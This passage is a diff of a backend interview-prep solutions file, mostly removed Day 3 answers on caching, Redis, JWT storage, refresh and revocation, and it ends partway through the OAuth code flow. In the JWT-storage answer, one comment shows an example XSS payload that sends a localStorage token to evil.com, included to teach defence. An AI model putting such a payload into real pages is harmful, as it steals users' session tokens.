@@ -1,4636 +1,4827 @@
-# ✅ Solutions — Day 3: 2 Years Experience (2 YOE)
+# ✅ Solutions — Day 4: 3 Years Experience (3 YOE)
 
 > **Series:** Backend Interview Prep · Fresher → 10 Years of Experience  
-> **Level:** Mid-Junior Developer — 2 Years of Experience  
-> **Questions File:** [day-03-2yoe.md](./day-03-2yoe.md)  
+> **Level:** Mid-Level Developer — 3 Years of Experience  
+> **Questions File:** [day-04-3yoe.md](./day-04-3yoe.md)  
 > **Total Answers:** 60  
 
-> 💡 **Tip:** At 2 YOE interviewers expect you to know the **"why"** behind tools, not just how to use them. Every answer here explains the reasoning, trade-offs, and real-world context.
+> 💡 **Tip:** At 3 YOE, interviewers expect you to understand distributed systems trade-offs, know when to use which tool, and have opinions backed by production experience.
 
 ---
 
 ## 📚 Table of Contents
 
-1. [Caching Strategies](#1-caching-strategies)
-2. [JWT & OAuth 2.0 Deep Dive](#2-jwt--oauth-20-deep-dive)
-3. [Database Indexing & Query Optimization](#3-database-indexing--query-optimization)
-4. [Docker & Containerization](#4-docker--containerization)
-5. [Background Jobs & Task Queues](#5-background-jobs--task-queues)
-6. [API Design Patterns](#6-api-design-patterns)
-7. [NoSQL Databases](#7-nosql-databases)
-8. [Web Security — Intermediate](#8-web-security--intermediate)
-9. [Performance & Scalability Basics](#9-performance--scalability-basics)
-10. [Software Architecture Patterns](#10-software-architecture-patterns)
+1. [Microservices Architecture](#1-microservices-architecture)
+2. [Message Brokers & Event-Driven Systems](#2-message-brokers--event-driven-systems)
+3. [CI/CD Pipelines](#3-cicd-pipelines)
+4. [Kubernetes Basics](#4-kubernetes-basics)
+5. [Advanced Database Concepts](#5-advanced-database-concepts)
+6. [Distributed Systems Fundamentals](#6-distributed-systems-fundamentals)
+7. [Observability — Logs, Metrics, Traces](#7-observability--logs-metrics-traces)
+8. [Advanced API Design](#8-advanced-api-design)
+9. [Cloud Fundamentals](#9-cloud-fundamentals)
+10. [Engineering Practices & Team Collaboration](#10-engineering-practices--team-collaboration)
 
 ---
 
-## 1. Caching Strategies
+## 1. Microservices Architecture
 
 ---
 
-**Q1. What is caching? What problem does it solve in backend systems?**
+**Q1. What is a microservices architecture? How does it differ from a monolith?**
 
 **Answer:**
 
-Caching stores the result of an expensive operation in fast-access storage so that future requests can be served instantly without repeating the work.
-
-**The problem it solves:**
+A **monolith** packages all features (auth, orders, payments, notifications) into one deployable unit. A **microservices architecture** splits the application into small, independently deployable services, each owning a specific business capability and its own database.
 
 ```
-Without cache:
-Every request → DB query (10–50ms) → response
-1000 requests/sec → 1000 DB queries/sec → DB overloaded → slow responses
-
-With cache:
-First request  → DB query (10ms) → store in Redis → response
-Next 999 reqs  → Redis hit (0.1ms) → response
-→ 1 DB query instead of 1000 ✅
-```
-
-**Real-world example:**
-
-```js
-// ❌ No caching — hits DB on every request
-app.get('/products/featured', async (req, res) => {
-  // This query joins 4 tables and takes 200ms
-  const products = await db.query(`
-    SELECT p.*, AVG(r.rating) as avg_rating, COUNT(o.id) as order_count
-    FROM products p
-    LEFT JOIN reviews r ON p.id = r.product_id
-    LEFT JOIN order_items o ON p.id = o.product_id
-    WHERE p.featured = true
-    GROUP BY p.id
-    ORDER BY order_count DESC
-    LIMIT 10
-  `);
-  res.json(products);
-});
-
-// ✅ With caching — DB hit only once per minute
-app.get('/products/featured', async (req, res) => {
-  const CACHE_KEY = 'featured_products';
-  const TTL = 60; // 1 minute
-
-  // Try cache first
-  const cached = await redis.get(CACHE_KEY);
-  if (cached) {
-    return res.json(JSON.parse(cached)); // 0.1ms instead of 200ms
-  }
-
-  // Cache miss — query DB
-  const products = await db.query('...(complex query)...');
-
-  // Store result in cache
-  await redis.setex(CACHE_KEY, TTL, JSON.stringify(products));
-
-  res.json(products);
-});
-```
-
-**What caching solves:**
-- **Latency** — memory (~0.1ms) vs DB (~10–200ms) = 100–2000x faster.
-- **Throughput** — serve more requests without scaling the DB.
-- **Cost** — fewer DB queries = lower RDS/cloud database bills.
-- **Resilience** — can serve cached data even when DB is briefly unavailable.
-
-> 📖 Reference: [Caching Overview — AWS](https://aws.amazon.com/caching/)
-
----
-
-**Q2. What is the difference between in-memory cache, distributed cache, and CDN cache?**
-
-**Answer:**
-
-| Type | Where stored | Scope | Speed | Use case |
-|------|-------------|-------|-------|---------|
-| **In-memory** | Inside the app process (RAM) | Single server only | Fastest (~ns) | Per-process short-lived data |
-| **Distributed** | External cache server (Redis/Memcached) | Shared across all servers | Fast (~0.1ms) | Session data, shared API responses |
-| **CDN** | Edge servers globally | All users near a region | Varies by location | Static files, public API responses |
-
-**Code examples:**
-
-```js
-// ── 1. In-Memory Cache (process-local) ──────────────────────────────
-// Simple: JS Map or object
-const cache = new Map();
-
-app.get('/config', (req, res) => {
-  if (cache.has('appConfig')) {
-    return res.json(cache.get('appConfig')); // nanoseconds
-  }
-  const config = loadConfig();
-  cache.set('appConfig', config);
-  res.json(config);
-});
-// ⚠️ Problem: each of your 8 Node.js cluster workers has its OWN cache
-// → inconsistent data across workers
-// → lost on restart
-
-// ── 2. Distributed Cache (Redis) ────────────────────────────────────
-// Shared across ALL server instances
-const redis = require('ioredis');
-const client = new redis(process.env.REDIS_URL);
-
-app.get('/user/:id', async (req, res) => {
-  const key = `user:${req.params.id}`;
-  const cached = await client.get(key);
-
-  if (cached) return res.json(JSON.parse(cached)); // ~0.1ms
-
-  const user = await db.query('SELECT * FROM users WHERE id = ?', [req.params.id]);
-  await client.setex(key, 300, JSON.stringify(user)); // cache 5 minutes
-  res.json(user);
-});
-// ✅ All 8 workers share the same Redis — consistent
-
-// ── 3. CDN Cache (Cloudflare/CloudFront) ────────────────────────────
-// Set cache headers so CDN stores the response at the edge
-app.get('/products', async (req, res) => {
-  const products = await getProducts();
-  res.set('Cache-Control', 'public, max-age=300, s-maxage=600');
-  // s-maxage=600: CDN caches for 10 minutes
-  // max-age=300: browser caches for 5 minutes
-  res.json(products);
-});
-// ✅ User in Mumbai hits Cloudflare's Mumbai edge, not your US server
-```
-
-> 📖 Reference: [Types of Caching — Cloudflare](https://www.cloudflare.com/learning/cdn/what-is-caching/)
-
----
-
-**Q3. Explain the Cache-Aside (Lazy Loading) pattern. What are its pros and cons?**
-
-**Answer:**
-
-In **Cache-Aside**, the application manages the cache manually. It checks the cache first, and only queries the database on a miss — then populates the cache.
-
-```
-Read flow:
-App → Check Cache → HIT  → return cached data
-                 → MISS → query DB → store in cache → return data
-
-Write flow:
-App → write to DB → invalidate/update cache entry
-```
-
-**Full implementation example:**
-
-```js
-class UserService {
-  constructor(db, redis) {
-    this.db = db;
-    this.redis = redis;
-  }
-
-  async getUser(userId) {
-    const cacheKey = `user:${userId}`;
-
-    // 1. Check cache
-    const cached = await this.redis.get(cacheKey);
-    if (cached) {
-      console.log('Cache HIT');
-      return JSON.parse(cached);
-    }
-
-    // 2. Cache MISS — fetch from DB
-    console.log('Cache MISS — fetching from DB');
-    const user = await this.db.query(
-      'SELECT * FROM users WHERE id = ?', [userId]
-    );
-
-    if (!user) return null;
-
-    // 3. Populate cache for next time (TTL: 5 minutes)
-    await this.redis.setex(cacheKey, 300, JSON.stringify(user));
-
-    return user;
-  }
-
-  async updateUser(userId, data) {
-    // 4. Update DB
-    await this.db.query(
-      'UPDATE users SET ? WHERE id = ?', [data, userId]
-    );
-
-    // 5. Invalidate cache — force fresh fetch next time
-    await this.redis.del(`user:${userId}`);
-    // Alternative: update cache with new data
-    // await this.redis.setex(`user:${userId}`, 300, JSON.stringify({...existingUser, ...data}));
-  }
-}
-```
-
-**Pros and Cons:**
-
-| Pros | Cons |
-|------|------|
-| Cache only populated for data that's actually requested | First request always slow (cold start) |
-| Cache failure doesn't block reads (falls back to DB) | Risk of stale data between DB write and cache invalidation |
-| Works well for read-heavy workloads | Manual cache management — easy to forget to invalidate |
-| Flexible TTL per key | DB and cache can temporarily diverge (consistency window) |
-
-> 📖 Reference: [Cache-Aside Pattern — Microsoft](https://learn.microsoft.com/en-us/azure/architecture/patterns/cache-aside)
-
----
-
-**Q4. What is the difference between Write-Through and Write-Behind (Write-Back) caching?**
-
-**Answer:**
-
-These patterns describe what happens to the cache when data is **written**.
-
-**Write-Through:** Every write goes to DB AND cache simultaneously.
-
-```js
-async function updateProductPrice(productId, newPrice) {
-  // Write to DB
-  await db.query('UPDATE products SET price = ? WHERE id = ?', [newPrice, productId]);
-
-  // Write to cache at the same time (synchronously)
-  await redis.setex(`product:${productId}`, 3600, JSON.stringify({ ...product, price: newPrice }));
-
-  return { success: true };
-}
-// ✅ Cache always up-to-date
-// ❌ Every write has double latency (DB + Redis)
-// ❌ Cache fills with data that may never be read (cache pollution)
-```
-
-**Write-Behind (Write-Back):** Write to cache immediately, write to DB asynchronously later.
-
-```js
-// High-speed writes: update cache instantly, batch-write to DB later
-async function trackPageView(pageId) {
-  const key = `page:views:${pageId}`;
-
-  // Instantly update cache — no DB wait
-  await redis.incr(key);
-
-  // Queue a DB write to happen later (every 60 seconds)
-  await jobQueue.add('flush-page-views', { pageId }, { delay: 60000 });
-}
-
-// Background job flushes accumulated counts to DB
-jobQueue.process('flush-page-views', async (job) => {
-  const { pageId } = job.data;
-  const views = await redis.get(`page:views:${pageId}`);
-  await db.query('UPDATE pages SET view_count = view_count + ? WHERE id = ?',
-    [views, pageId]
-  );
-  await redis.del(`page:views:${pageId}`);
-});
-// ✅ Extremely fast writes (in-memory only)
-// ❌ Risk of data loss if cache crashes before DB write
-// ❌ More complex — harder to implement correctly
-```
-
-**Comparison:**
-
-| | Write-Through | Write-Behind |
-|--|--------------|-------------|
-| Consistency | Strong (cache = DB always) | Eventual (DB lags behind cache) |
-| Write speed | Slower (waits for both DB + cache) | Fastest (cache only) |
-| Data loss risk | None | Yes (if cache crashes) |
-| Use case | Financial data, user profiles | Analytics counters, view counts, likes |
-
-> 📖 Reference: [Caching Strategies — Hazelcast](https://hazelcast.com/blog/a-hitchhikers-guide-to-caching-patterns/)
-
----
-
-**Q5. What is a cache eviction policy? Explain LRU, LFU, and FIFO.**
-
-**Answer:**
-
-When a cache reaches its memory limit, an **eviction policy** decides which entries to remove to make room for new ones.
-
-| Policy | Full Name | How it works | Best for |
-|--------|-----------|-------------|---------|
-| **LRU** | Least Recently Used | Evict the item that hasn't been accessed for the longest time | General purpose — most common |
-| **LFU** | Least Frequently Used | Evict the item accessed the fewest total times | Long-lived data with clear hot/cold patterns |
-| **FIFO** | First In, First Out | Evict the oldest-inserted item regardless of usage | Simple queues, time-sequenced data |
-| **TTL** | Time To Live | Evict after a set time regardless of usage | Data with known freshness requirements |
-
-**Visual example — LRU with 3 slots:**
-
-```
-Access sequence: A, B, C, D (cache full after A, B, C)
-
-State:  [A, B, C]
-Access D → cache full → evict LRU (A, least recently used)
-State:  [B, C, D]
-Access B → B is now most recently used
-State:  [C, D, B]
-Access E → evict LRU (C)
-State:  [D, B, E]
-```
-
-**Redis eviction policy configuration:**
-
-```bash
-# redis.conf
-maxmemory 256mb
-maxmemory-policy allkeys-lru    # LRU across all keys (most common)
-# Other options:
-# allkeys-lfu                   # LFU across all keys
-# volatile-lru                  # LRU only among keys with TTL set
-# volatile-ttl                  # evict keys with soonest TTL first
-# noeviction                    # return error when memory full (dangerous!)
-```
-
-```js
-// In Node.js: LRU cache library
-const LRU = require('lru-cache');
-
-const cache = new LRU({
-  max: 500,            // max 500 items
-  ttl: 1000 * 60 * 5, // 5 minute TTL
-  // Uses LRU eviction automatically when max is reached
-});
-
-cache.set('user:1', { id: 1, name: 'Alice' });
-cache.set('user:2', { id: 2, name: 'Bob' });
-
-const user = cache.get('user:1'); // marks user:1 as recently used
-```
-
-> 📖 Reference: [Cache Eviction Policies — Redis Docs](https://redis.io/docs/reference/eviction/)
-
----
-
-**Q6. What is a cache stampede (thundering herd problem)? How do you prevent it?**
-
-**Answer:**
-
-A **cache stampede** occurs when a popular cache entry expires and many concurrent requests simultaneously find a cache miss — all of them race to query the database and repopulate the cache at the same time, overwhelming the DB.
-
-```
-Normal operation:
-1000 req/sec → cache HIT → DB: 0 queries/sec ✅
-
-Cache entry expires:
-1000 simultaneous requests → cache MISS → 1000 concurrent DB queries → DB crash! 💥
-```
-
-**Prevention strategies:**
-
-```js
-// ── Strategy 1: Mutex Lock (only one request rebuilds cache) ────────
-const redis = require('ioredis');
-const client = new redis();
-
-async function getPopularProducts() {
-  const CACHE_KEY = 'popular_products';
-  const LOCK_KEY  = 'lock:popular_products';
-  const TTL = 300;
-
-  // Check cache
-  const cached = await client.get(CACHE_KEY);
-  if (cached) return JSON.parse(cached);
-
-  // Try to acquire lock (only ONE worker wins)
-  const lockAcquired = await client.set(LOCK_KEY, '1', 'NX', 'EX', 10);
-
-  if (lockAcquired) {
-    try {
-      // This worker rebuilds the cache
-      const products = await db.query('SELECT * FROM products ORDER BY sales DESC LIMIT 20');
-      await client.setex(CACHE_KEY, TTL, JSON.stringify(products));
-      return products;
-    } finally {
-      await client.del(LOCK_KEY); // release lock
-    }
-  } else {
-    // Other workers wait briefly and retry
-    await new Promise(resolve => setTimeout(resolve, 50));
-    return getPopularProducts(); // retry — cache likely populated now
-  }
-}
-
-// ── Strategy 2: Early Expiry / Probabilistic Refresh ────────────────
-// Refresh cache slightly BEFORE it expires (no stampede ever happens)
-async function getWithEarlyRefresh(key, ttl, fetchFn) {
-  const data = await client.get(key);
-  if (data) {
-    const { value, expiresAt } = JSON.parse(data);
-    const secondsLeft = (expiresAt - Date.now()) / 1000;
-
-    // If within 10% of expiry, refresh in background (only one request does this)
-    if (secondsLeft < ttl * 0.1) {
-      fetchFn().then(fresh => {
-        client.setex(key, ttl, JSON.stringify({
-          value: fresh,
-          expiresAt: Date.now() + ttl * 1000
-        }));
-      });
-    }
-    return value; // still serve stale data while refreshing
-  }
-
-  // Cold start
-  const fresh = await fetchFn();
-  await client.setex(key, ttl, JSON.stringify({
-    value: fresh,
-    expiresAt: Date.now() + ttl * 1000
-  }));
-  return fresh;
-}
-
-// ── Strategy 3: Staggered TTLs ──────────────────────────────────────
-// Add random jitter to TTL so all keys don't expire simultaneously
-function jitteredTTL(baseTTL) {
-  const jitter = Math.floor(Math.random() * baseTTL * 0.1); // ±10%
-  return baseTTL + jitter;
-}
-await client.setex('products:page:1', jitteredTTL(300), data);
-await client.setex('products:page:2', jitteredTTL(300), data);
-// Without jitter: both expire at exactly t=300 → simultaneous stampede
-// With jitter: one expires at 297, other at 312 → staggered
-```
-
-> 📖 Reference: [Cache Stampede — Wikipedia](https://en.wikipedia.org/wiki/Cache_stampede)
-
----
-
-**Q7. What is cache invalidation? Why is it considered one of the hardest problems in CS?**
-
-**Answer:**
-
-**Cache invalidation** is the process of removing or updating cached data when the source of truth (database) changes. Phil Karlton famously said:
-
-> *"There are only two hard things in Computer Science: cache invalidation and naming things."*
-
-**Why it's hard:**
-
-```js
-// Scenario: user updates their profile
-// What needs to be invalidated?
-
-await db.query('UPDATE users SET name = ?, email = ? WHERE id = ?',
-  ['Alice Smith', 'alice@new.com', 42]
-);
-
-// ❌ Easy to forget these caches:
-await redis.del('user:42');                    // direct user cache
-await redis.del('user:profile:42');            // profile page cache
-await redis.del('user:orders:42');             // orders might show user name
-await redis.del('admin:users:list');           // admin user list cache
-await redis.del('search:users:alice');         // search cache
-await redis.del('leaderboard');                // if leaderboard shows usernames
-await redis.del('notification:recipients:42'); // notification cache
-// Miss even one → stale data shown somewhere ← the hard part
-```
-
-**Common invalidation strategies:**
-
-```js
-// ── 1. TTL-based (simplest — accept eventual consistency) ────────────
-await redis.setex('user:42', 300, JSON.stringify(user));
-// Just let it expire. Stale for up to 5 minutes — acceptable for most cases.
-
-// ── 2. Event-based invalidation (cache listens to DB changes) ────────
-// Use Debezium CDC or DB triggers to emit events when data changes
-eventBus.on('user.updated', async ({ userId }) => {
-  const patterns = [
-    `user:${userId}`,
-    `user:profile:${userId}`,
-    `user:orders:${userId}`,
-  ];
-  await Promise.all(patterns.map(key => redis.del(key)));
-});
-
-// ── 3. Cache tags / grouped invalidation ─────────────────────────────
-// Tag related cache entries so you can invalidate groups at once
-async function cacheWithTags(key, value, tags, ttl) {
-  await redis.setex(key, ttl, JSON.stringify(value));
-  // Associate key with each tag
-  for (const tag of tags) {
-    await redis.sadd(`tag:${tag}`, key);
-    await redis.expire(`tag:${tag}`, ttl + 60);
-  }
-}
-
-async function invalidateByTag(tag) {
-  const keys = await redis.smembers(`tag:${tag}`);
-  if (keys.length) await redis.del(...keys, `tag:${tag}`);
-}
-
-// Cache user data with tags
-await cacheWithTags('user:42', user, ['user:42', 'users:list'], 300);
-
-// Invalidate everything tagged with 'user:42'
-await invalidateByTag('user:42'); // deletes user:42, AND its appearance in users:list
-```
-
-> 📖 Reference: [Cache Invalidation — Martin Fowler](https://martinfowler.com/bliki/TwoHardThings.html)
-
----
-
-**Q8. What is Redis? What are its common use cases beyond caching?**
-
-**Answer:**
-
-**Redis** (Remote Dictionary Server) is an in-memory data structure store — often called a "data structure server" rather than just a cache. It supports strings, lists, sets, sorted sets, hashes, streams, and more.
-
-**Use cases beyond caching:**
-
-```js
-const redis = require('ioredis');
-const client = new redis();
-
-// ── 1. Session Store ─────────────────────────────────────────────────
-// Store user sessions in Redis (shared across all servers)
-await client.setex(`session:${sessionId}`, 3600, JSON.stringify({
-  userId: 42, role: 'admin', loginTime: Date.now()
-}));
-
-// ── 2. Rate Limiting ─────────────────────────────────────────────────
-async function rateLimit(userId, limit = 100, windowSeconds = 60) {
-  const key = `ratelimit:${userId}:${Math.floor(Date.now() / 60000)}`;
-  const count = await client.incr(key);
-  if (count === 1) await client.expire(key, windowSeconds);
-  return count <= limit;
-}
-
-// ── 3. Pub/Sub (real-time messaging) ─────────────────────────────────
-// Publisher: send a message
-await client.publish('notifications:user:42', JSON.stringify({
-  type: 'ORDER_SHIPPED', orderId: 99
-}));
-
-// Subscriber: listen for messages
-const subscriber = client.duplicate();
-await subscriber.subscribe('notifications:user:42');
-subscriber.on('message', (channel, message) => {
-  const event = JSON.parse(message);
-  sendWebSocketNotification(event);
-});
-
-// ── 4. Leaderboard (Sorted Set) ──────────────────────────────────────
-// Add/update score
-await client.zadd('game:leaderboard', 1500, 'player:alice');
-await client.zadd('game:leaderboard', 2200, 'player:bob');
-await client.zadd('game:leaderboard', 800,  'player:charlie');
-
-// Get top 10 players with scores (highest first)
-const top10 = await client.zrevrangebyscore(
-  'game:leaderboard', '+inf', '-inf', 'WITHSCORES', 'LIMIT', 0, 10
-);
-
-// Get a player's rank
-const rank = await client.zrevrank('game:leaderboard', 'player:alice');
-
-// ── 5. Distributed Lock ──────────────────────────────────────────────
-const lockKey = `lock:payment:${orderId}`;
-const acquired = await client.set(lockKey, '1', 'NX', 'EX', 30);
-// NX = only set if not exists; EX = expire in 30 seconds
-
-// ── 6. Job Queue (using BullMQ) ──────────────────────────────────────
-const { Queue } = require('bullmq');
-const emailQueue = new Queue('emails', { connection: client });
-await emailQueue.add('send-welcome', { userId: 42, email: 'alice@example.com' });
-```
-
-> 📖 Reference: [Redis Use Cases — Redis Docs](https://redis.io/docs/about/)
-
----
-
-**Q9. What is a TTL (Time To Live) in caching? How do you decide what TTL to set?**
-
-**Answer:**
-
-**TTL** is a duration after which a cache entry automatically expires and is removed. It prevents stale data from living in the cache forever.
-
-```js
-// Set TTL in Redis
-await redis.setex('user:42', 300, JSON.stringify(user)); // expires in 300 seconds
-await redis.set('user:42', JSON.stringify(user), 'EX', 300); // same thing
-await redis.set('user:42', JSON.stringify(user), 'PX', 300000); // in milliseconds
-
-// Check remaining TTL
-const ttl = await redis.ttl('user:42'); // returns seconds remaining (-1 = no TTL, -2 = doesn't exist)
-```
-
-**How to decide TTL — based on data characteristics:**
-
-| Data | Recommended TTL | Reasoning |
-|------|----------------|-----------|
-| User session | 30 minutes–24 hours | Security + UX balance |
-| User profile | 5–15 minutes | Changes infrequently; some staleness acceptable |
-| Product catalog | 1–10 minutes | Changes rarely, reads very heavy |
-| Home page featured items | 1–5 minutes | Content team updates a few times/day |
-| Real-time stock price | 1–5 seconds | Must be fresh |
-| Exchange rates | 1 minute | Changes frequently but not by the second |
-| Static config | 1 hour+ | Almost never changes |
-| Search autocomplete | 10–30 minutes | Acceptable eventual consistency |
-
-**Decision framework:**
-
-```
-TTL decision questions:
-1. How often does this data change in the DB? → shorter TTL for frequent changes
-2. How bad is it to show stale data?          → financial data = very bad → short TTL
-3. How expensive is the DB query?             → expensive query → longer TTL
-4. How many requests hit this data?           → viral/hot data → longer TTL
-5. Can I invalidate on write instead?         → yes → use longer TTL + invalidation
-```
-
-```js
-// ✅ Different TTLs for different data types
-const TTL = {
-  USER_PROFILE:    5  * 60,  // 5 minutes
-  PRODUCT_DETAIL:  10 * 60,  // 10 minutes
-  FEATURED_LIST:   2  * 60,  // 2 minutes
-  EXCHANGE_RATE:   60,        // 1 minute
-  CONFIG:          60 * 60,  // 1 hour
-  USER_SESSION:    30 * 60,  // 30 minutes
-};
-```
-
-> 📖 Reference: [TTL in Caching — Cloudflare](https://www.cloudflare.com/learning/cdn/glossary/time-to-live-ttl/)
-
----
-
-## 2. JWT & OAuth 2.0 Deep Dive
-
----
-
-**Q10. What are the security risks of storing a JWT in localStorage vs an HttpOnly cookie?**
-
-**Answer:**
-
-| | localStorage | HttpOnly Cookie |
-|--|-------------|----------------|
-| XSS vulnerability | ❌ Yes — JS can read it | ✅ No — JS cannot access HttpOnly cookies |
-| CSRF vulnerability | ✅ No — not auto-sent | ❌ Yes — browser auto-attaches cookies |
-| Access by JS | Yes | No |
-| Sent automatically | No (must add to headers manually) | Yes (browser handles it) |
-| Works across tabs | Yes | Yes |
-| Server can set | No (client-side only) | Yes |
-
-**localStorage attack example:**
-
-```js
-// Attacker's XSS payload injected into your page:
-// <script>fetch('https://evil.com/steal?token=' + localStorage.getItem('jwt'))</script>
-// → All tokens instantly stolen from every user who visits the compromised page
-
-// ❌ Risky: storing JWT in localStorage
-localStorage.setItem('token', jwt);
-// Every fetch:
-fetch('/api/orders', {
-  headers: { 'Authorization': `Bearer ${localStorage.getItem('token')}` }
-});
-```
-
-**HttpOnly Cookie — protected from XSS:**
-
-```js
-// ✅ Server sets HttpOnly cookie — JS cannot read it
-app.post('/login', async (req, res) => {
-  const token = jwt.sign({ userId: user.id }, process.env.JWT_SECRET, { expiresIn: '15m' });
-
-  res.cookie('accessToken', token, {
-    httpOnly: true,  // ← JS cannot read this cookie
-    secure:   true,  // ← only sent over HTTPS
-    sameSite: 'Strict', // ← prevents CSRF
-    maxAge:   15 * 60 * 1000 // 15 minutes
-  });
-
-  res.json({ message: 'Logged in' });
-});
-
-// Middleware reads from cookie (not Authorization header)
-app.use((req, res, next) => {
-  const token = req.cookies.accessToken; // auto-attached by browser
-  if (!token) return res.status(401).json({ error: 'Not authenticated' });
-
-  try {
-    req.user = jwt.verify(token, process.env.JWT_SECRET);
-    next();
-  } catch {
-    res.status(401).json({ error: 'Invalid token' });
-  }
-});
-```
-
-**Best practice for SPAs:** Store access token in memory (JS variable), refresh token in HttpOnly cookie. This way XSS can steal the short-lived access token at worst, but cannot silently obtain new tokens.
-
-> 📖 Reference: [JWT Storage — OWASP](https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#local-storage)
-
----
-
-**Q11. What is JWT token expiry? How do you handle token refresh without logging the user out?**
-
-**Answer:**
-
-JWT expiry (`exp` claim) makes tokens time-limited for security. A compromised token is only valid until it expires. But short expiry = frequent user logouts if not handled properly.
-
-**Silent token refresh flow:**
-
-```
-Timeline:
-t=0:   User logs in → gets accessToken (15min) + refreshToken (30 days)
-t=14m: accessToken about to expire
-t=15m: accessToken expired → next API call fails with 401
-
-Without silent refresh: User is logged out and must re-enter credentials 😩
-With silent refresh: New accessToken obtained transparently — user doesn't notice ✅
-```
-
-**Implementation:**
-
-```js
-// ── Server: refresh endpoint ─────────────────────────────────────────
-app.post('/auth/refresh', async (req, res) => {
-  const refreshToken = req.cookies.refreshToken; // HttpOnly cookie
-  if (!refreshToken) return res.status(401).json({ error: 'No refresh token' });
-
-  try {
-    const payload = jwt.verify(refreshToken, process.env.REFRESH_SECRET);
-
-    // Verify it hasn't been revoked
-    const stored = await redis.get(`refreshToken:${payload.userId}`);
-    if (stored !== refreshToken) {
-      return res.status(401).json({ error: 'Refresh token revoked' });
-    }
-
-    // Issue new access token
-    const newAccessToken = jwt.sign(
-      { userId: payload.userId, role: payload.role },
-      process.env.JWT_SECRET,
-      { expiresIn: '15m' }
-    );
-
-    res.json({ accessToken: newAccessToken });
-  } catch {
-    res.clearCookie('refreshToken');
-    res.status(401).json({ error: 'Invalid refresh token — please log in again' });
-  }
-});
-
-// ── Client: axios interceptor for silent refresh ─────────────────────
-const axios = require('axios');
-
-let accessToken = null; // stored in memory — not localStorage!
-
-const api = axios.create({ baseURL: '/api', withCredentials: true });
-
-// Attach token to every request
-api.interceptors.request.use(config => {
-  if (accessToken) {
-    config.headers.Authorization = `Bearer ${accessToken}`;
-  }
-  return config;
-});
-
-// On 401, silently refresh and retry
-api.interceptors.response.use(
-  response => response,
-  async error => {
-    const originalRequest = error.config;
-
-    if (error.response?.status === 401 && !originalRequest._retry) {
-      originalRequest._retry = true;
-
-      try {
-        // Refresh token is in HttpOnly cookie — sent automatically
-        const { data } = await axios.post('/auth/refresh', {}, { withCredentials: true });
-        accessToken = data.accessToken; // store new token in memory
-
-        // Retry the original failed request with new token
-        originalRequest.headers.Authorization = `Bearer ${accessToken}`;
-        return api(originalRequest);
-      } catch {
-        // Refresh failed → redirect to login
-        window.location.href = '/login';
-      }
-    }
-
-    return Promise.reject(error);
-  }
-);
-```
-
-> 📖 Reference: [Silent Refresh — Auth0](https://auth0.com/docs/tokens/refresh-tokens/use-refresh-tokens)
-
----
-
-**Q12. What is token revocation? Why is it hard with JWTs and how do you work around it?**
-
-**Answer:**
-
-**Token revocation** means invalidating a token before its natural expiry — e.g., when a user logs out, changes password, or is banned.
-
-**Why it's hard with JWTs:**
-JWTs are **stateless** — the server verifies the signature without consulting any database. There's no central registry of "valid" tokens. The token is valid until the `exp` time, regardless of what happened on the server.
-
-```
-Problem:
-User logs out at t=0
-Access token still valid until t=15m
-If attacker has the token, they can still use the API for 15 minutes! 😱
-```
-
-**Solutions:**
-
-```js
-// ── Solution 1: Short TTL + Refresh Token Rotation ───────────────────
-// Access token: 5–15 minutes TTL
-// Accept that a compromised token is valid for at most 15 minutes
-// This is the most common production approach
-
-// ── Solution 2: Token Blocklist (Denylist) in Redis ──────────────────
-// On logout: add token JTI (JWT ID) to blocklist
-app.post('/logout', requireAuth, async (req, res) => {
-  const token = req.headers.authorization.split(' ')[1];
-  const payload = jwt.decode(token);
-
-  // Add to blocklist until natural expiry
-  const ttl = payload.exp - Math.floor(Date.now() / 1000);
-  if (ttl > 0) {
-    await redis.setex(`blocklist:${payload.jti}`, ttl, '1');
-  }
-
-  res.clearCookie('refreshToken');
-  res.json({ message: 'Logged out' });
-});
-
-// In auth middleware: check blocklist
-const requireAuth = async (req, res, next) => {
-  const token = req.headers.authorization?.split(' ')[1];
-  if (!token) return res.status(401).json({ error: 'No token' });
-
-  const payload = jwt.verify(token, process.env.JWT_SECRET);
-
-  // Check blocklist (one Redis lookup per request)
-  const isRevoked = await redis.exists(`blocklist:${payload.jti}`);
-  if (isRevoked) return res.status(401).json({ error: 'Token revoked' });
-
-  req.user = payload;
-  next();
-};
-
-// Issue tokens with JTI (JWT ID)
-const token = jwt.sign(
-  { userId: user.id, role: user.role, jti: crypto.randomUUID() },
-  process.env.JWT_SECRET,
-  { expiresIn: '15m' }
-);
-
-// ── Solution 3: Version number in token ──────────────────────────────
-// Store a tokenVersion on the user record; increment on logout/password change
-const token = jwt.sign(
-  { userId: user.id, tokenVersion: user.tokenVersion },
-  process.env.JWT_SECRET,
-  { expiresIn: '15m' }
-);
-
-// In middleware:
-const requireAuth = async (req, res, next) => {
-  const payload = jwt.verify(token, process.env.JWT_SECRET);
-
-  // DB lookup to check version (makes it stateful — one DB query per request)
-  const user = await User.findById(payload.userId);
-  if (user.tokenVersion !== payload.tokenVersion) {
-    return res.status(401).json({ error: 'Token invalidated' });
-  }
-  // ...
-};
-// On logout: await User.update(userId, { tokenVersion: tokenVersion + 1 });
-// All existing tokens for this user immediately invalid
-```
-
-> 📖 Reference: [JWT Revocation — Pragmatic Web Security](https://pragmaticwebsecurity.com/articles/oauthoidc/jwt-token-revocation.html)
-
----
-
-**Q13. Explain the OAuth 2.0 Authorization Code Flow step by step.**
-
-**Answer:**
-
-The **Authorization Code Flow** is used when a server-side app wants to access a user's data on a third-party service (e.g., "Login with Google").
-
-```
-Actors:
-- User (Resource Owner)
-- Your App (Client)
-- Google Auth Server (Authorization Server)
-- Google APIs (Resource Server)
-
-Step-by-step:
-```
-
-```
-1. User clicks "Login with Google" on your app
-
-2. Your app redirects user to Google's auth page:
-   GET https://accounts.google.com/o/oauth2/auth
-   ?client_id=YOUR_CLIENT_ID
-   &redirect_uri=https://yourapp.com/auth/callback
-   &response_type=code
-   &scope=openid email profile
-   &state=random_csrf_token_abc123   ← prevents CSRF
-
-3. Google shows login/consent screen
-   User: "Yes, allow yourapp to access my profile"
-
-4. Google redirects back to your app with an authorization code:
-   GET https://yourapp.com/auth/callback
-   ?code=4/0AX4XfWi...abc
-   &state=random_csrf_token_abc123
-
-5. Your backend validates state, then exchanges code for tokens:
-   POST https://oauth2.googleapis.com/token
-   {
-     code:          "4/0AX4XfWi...abc",
-     client_id:     "YOUR_CLIENT_ID",
-     client_secret: "YOUR_CLIENT_SECRET",  ← kept on server, never exposed to browser
-     redirect_uri:  "https://yourapp.com/auth/callback",
-     grant_type:    "authorization_code"
